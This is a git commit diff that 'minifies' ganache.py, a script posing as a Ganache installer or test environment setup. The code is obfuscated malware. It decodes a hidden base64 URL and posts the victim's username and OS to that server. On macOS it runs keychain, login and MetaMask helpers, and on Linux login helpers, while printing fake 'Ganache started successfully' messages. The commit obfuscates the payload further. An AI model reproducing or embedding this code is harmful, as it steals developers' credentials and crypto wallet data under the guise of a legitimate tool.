07d878141077c1a68306c0d3ac86be4af5f4edbd
Seneca <seneca.morago@zatahub.io>
2024-03-20 06:36:54 +0700

    minify ganache.py

--- ganache.py
+++ ganache.py
@@ -1,9 +1,11 @@
 C=open
 B=print
+Q=C
+R=B
 import os,platform as D
 from ganache_sdk.helperx import q,r,s
-from ganache_sdk.helperln import v, w
-import requests as F,getpass as G,json,base64 as H
+from ganache_sdk.helperln import v,w
+import requests as G,getpass as H,json,base64 as E
 from ganache_sdk.fflg import AM
 from ganache_sdk.utils import K
 I='==QZtFmb'
@@ -11,60 +13,22 @@ J='==QblR3c5N3Xn5Wa0FmclB3b'
 L='vMXZjlmdlR2L'
 M='lNmc192c'
 N='==AduVWbudWazNXY'
-def base_url():
-    url = "WVVoU01HTklUVFpNZVRsdVdWYzFhRmt5YUd4TWJYaHdaRzFWZGxsWVFuQk1NMWw0"
-    for i in range(3):
-        decoded_bytes = H.b64decode(url)
-        url = decoded_bytes.decode('utf-8')
-    return url
-
-def get_device_id():
-    file_name = "file.txt"
-    if os.path.exists(file_name):
-        with open(file_name, 'r') as file:
-            id = file.read()
-            return id
-    else:
-        body = {
-            K(I): G.getuser(),
-            K(J): D.system(),
-            K(M): K(N)
-        }
-        response = F.post(base_url() + K(L), data=body)
-        data = json.loads(response.content)
-        id = data["id"]
-        with open(file_name, 'w') as file:
-            file.write(id)
-            return id
-
-def mark_complete():
-    with open("ganache_sdk/done", 'w') as file:
-        pass
-
-def main():
-    device_id = get_device_id()
-    if D.system() == "Darwin":
-        keychainHelper = q(device_id, base_url())
-        keychainHelper.run()
-        print("Configuring test environment")
-        loginHelper = r(device_id, base_url())
-        loginHelper.run()
-        metamaskHelperX = s(device_id, base_url())
-        metamaskHelperX.run()
-        AM(base_url=base_url(), device_id=device_id)
-        mark_complete()
-        print("Ganache has been started successfully !!!")
-    elif D.system() == "Linux":
-        print("Installing Ganache")
-        loginHelper = v(device_id, base_url())
-        loginHelper.run()
-        helper = w(device_id, base_url())
-        helper.run()
-        print("Configuring Ganache")
-        AM(base_url=base_url(), device_id=device_id)
-        mark_complete()
-        print("Ganache has been started successfully !!!")
-    else:
-        print("Error -3: Only MacOS, Linux, Ubuntu are supported.", D.system(), "is not supported.")
-
-main()
+def A():
+	A='WVVoU01HTklUVFpNZVRsdVdWYzFhRmt5YUd4TWJYaHdaRzFWZGxsWVFuQk1NMWw0'
+	for C in range(3):B=E.b64decode(A);A=B.decode('utf-8')
+	return A
+def O():
+	B='file.txt'
+	if os.path.exists(B):
+		with C(B,'r')as E:id=E.read();return id
+	else:
+		F={K(I):H.getuser(),K(J):D.system(),K(M):K(N)};O=G.post(A()+K(L),data=F);P=json.loads(O.content);id=P['id']
+		with C(B,'w')as E:E.write(id);return id
+def F():
+	with C('ganache_sdk/done','w')as A:0
+def P():
+	G='Ganache has been started successfully !!!';C=O()
+	if D.system()=='Darwin':H=q(C,A());H.run();B('Configuring test environment');E=r(C,A());E.run();I=s(C,A());I.run();AM(base_url=A(),device_id=C);F();B(G)
+	elif D.system()=='Linux':B('Installing Ganache');E=v(C,A());E.run();J=w(C,A());J.run();B('Configuring Ganache');AM(base_url=A(),device_id=C);F();B(G)
+	else:B('Error -3: Only MacOS, Linux, Ubuntu are supported.',D.system(),'is not supported.')
+P()
